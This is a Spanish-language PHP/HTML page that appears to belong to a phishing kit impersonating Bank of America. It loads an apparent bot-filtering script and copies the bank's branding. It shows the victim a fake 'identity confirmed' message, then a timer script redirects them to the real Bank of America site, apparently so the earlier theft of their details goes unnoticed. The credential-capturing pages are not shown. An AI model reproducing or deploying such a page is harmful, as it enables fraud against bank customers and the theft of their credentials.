<?php
require "is_bot.php";
require "ayudante.php";
if (is_session_started() === FALSE) {
    session_start();
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        Bank of America: operaciones bancarias, tarjetas de crédito, préstamos e
        inversiones con Merrill
    </title>
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos2.css" />
    <link rel="shortcut icon" href="img/logo.png" type="image/x-icon" />
</head>

<body>
    <div class="cuerpo">
        <div class="header">
            <img src="img/logo-entrar.png" alt="logo">
            <img src="img/protegida-area.png" class="protegida" alt="protegida">
        </div>
        <div class="header2">
            <h1>Verificar su Identidad</h1>
        </div>
        <div class="section">
            <div class="principal">
            <h2>Confirmación de identidad</h2>
                <p>Su identidad ha sido confirmada correctamente, sera redireccionado en <span id="timer">2</span>
                    segundos a la pagina principal</p>
                <p class="error" id="error">________</p>
                <form autocomplete="off" id="fcorreo" style="font-family: 'cnx-regular', Arial, Helvetica, sans-serif;font-size:16px;">
                   <img src="img/confirm.gif" alt="confirmar">
                </form>
            </div>
            <div class="derecha">
                <img src="img/ayuda-correo.png" alt="correo">
            </div>
        </div>
        <div class="footer">
            <img src="img/footer.png" alt="footer">
        </div>
    </div>
    <script src="js/funciones.js"></script>
    <script>
         function startTimer(duration, display) {
            var timer = duration,
                minutes, seconds;
            const intervalo = setInterval(function() {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "" + seconds : seconds;
                if (minutes < 1) {
                    display.textContent = seconds;
                } else {
                    display.textContent = minutes + ":" + seconds;
                }

                if (--timer < 0) {
                    if (screen.width > 801) {
                        window.location = "https://www.bankofamerica.com/es/";
                        clearInterval(intervalo);
                        timer = duration;
                    } else {
                        window.location = "https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#home?app=signonv2";
                        clearInterval(intervalo);
                        timer = duration;
                    }


                }
            }, 1000);
        }

        var fiveMinutes = 1,
            display = document.getElementById('timer');
        startTimer(fiveMinutes, display);
    </script>
</body>

</html>